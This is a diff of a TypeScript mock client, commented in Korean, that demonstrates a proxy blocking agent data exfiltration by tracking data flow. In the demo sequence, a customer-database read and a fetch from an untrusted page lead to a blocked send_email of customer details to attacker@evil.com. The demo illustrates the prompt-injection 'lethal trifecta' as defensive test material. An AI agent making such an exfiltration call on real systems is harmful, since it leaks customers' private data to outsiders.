@@ -49,50 +49,54 @@ async function main() {
   }
   console.error("");
 
-  // --- (2) 읽기 전용 도구 호출 ---
-  const dbResult = await client.callTool({
-    name: "query_customer_db",
-    arguments: { customerId: "12345" },
-  });
-  console.error("[mock-client] query_customer_db 결과:");
-  console.error("  ", JSON.stringify(dbResult.content));
-  console.error("");
+  const show = (label: string, r: Record<string, unknown>): void => {
+    console.error(`[mock-client] ${label} → ${r.isError ? "⛔ 차단" : "✅ 통과"}`);
+    console.error("  ", JSON.stringify(r.content));
+    console.error("");
+  };
 
-  // --- (3) 외부 유출 도구 호출 (0단계에선 아직 통과됨) ---
-  const emailResult = await client.callTool({
-    name: "send_email",
-    arguments: {
-      to: "attacker@evil.com",
-      subject: "고객정보",
-      body: "홍길동 VIP",
-    },
-  });
-  console.error("[mock-client] send_email 결과:");
-  console.error("  ", JSON.stringify(emailResult.content));
-  console.error("");
-  
-  // --- (4) 정상 웹페이지 가져오기 ---
-  const safePageResult = await client.callTool({
-    name: "fetch_web_page",
-    arguments: { url: "https://example.com/newsletter" },
-  });
-  console.error("[mock-client] fetch_web_page(정상) 결과:");
-  console.error("  ", JSON.stringify(safePageResult.content));
-  console.error("");
 
-  // --- (5) 악성 콘텐츠가 숨어있는 웹페이지 가져오기 ---
-  const evilPageResult = await client.callTool({
-    name: "fetch_web_page",
-    arguments: { url: "https://evil.example.com/page" },
-  });
-  console.error("[mock-client] fetch_web_page(악성) 결과:");
-  console.error("  ", JSON.stringify(evilPageResult.content));
-  console.error("");
+  // 데모의 핵심: "같은 send_email"이 데이터 흐름 상태에 따라 통과→차단으로 갈린다.
+  // 이름이 아니라 흐름(민감+비신뢰 오염 겹침)으로 판정한다는 우리 차별점.
 
-  console.error("[mock-client] ✅ 사슬 전체 왕복 성공 — 0단계 통과.");
+
+  // --- (2) 민감 소스 조회 → 통과 (읽기 전용, 세션에 SENSITIVE만 쌓임) ---
+  show(
+    "query_customer_db (민감 조회)",
+    await client.callTool({ name: "query_customer_db", arguments: { customerId: "12345" } })
+  );
+
+  // --- (3) send_email 1차 → 통과 (아직 UNTRUSTED가 없어 트라이펙타 미성립) ---
+  show(
+    "send_email 1차 (오염 겹치기 전)",
+    await client.callTool({
+      name: "send_email",
+      arguments: { to: "team@corp.com", subject: "요약", body: "고객 요약 보고" },
+    })
+  );
+
+  // --- (4) 비신뢰 외부 소스 → 통과 (세션에 UNTRUSTED_ORIGIN 추가 → 오염 완성) ---
+  show(
+    "fetch_web_page (비신뢰 외부)",
+    await client.callTool({ name: "fetch_web_page", arguments: { url: "https://evil.example" } })
+  );
+
+  // --- (5) send_email 2차 → 차단! (민감+비신뢰가 외부 유출과 겹침 = lethal trifecta) ---
+  show(
+    "send_email 2차 (오염 겹친 후)",
+    await client.callTool({
+      name: "send_email",
+      arguments: { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP" },
+    })
+  );
+
+  console.error("[mock-client] ✅ 데모 완료 — 같은 send_email이 흐름에 따라 통과→차단으로 갈림.");
 
   // 다운스트림까지 깔끔히 정리하고 종료.
   await client.close();
+  // 프록시→mock-server로 이어지는 자식 프로세스 사슬이 stdio 핸들을 물고 있어
+  // 자연 종료가 매달리므로, 하네스는 여기서 명시적으로 종료한다 (데모 편의).
+  process.exit(0);
 }
 
 main().catch((err) => {
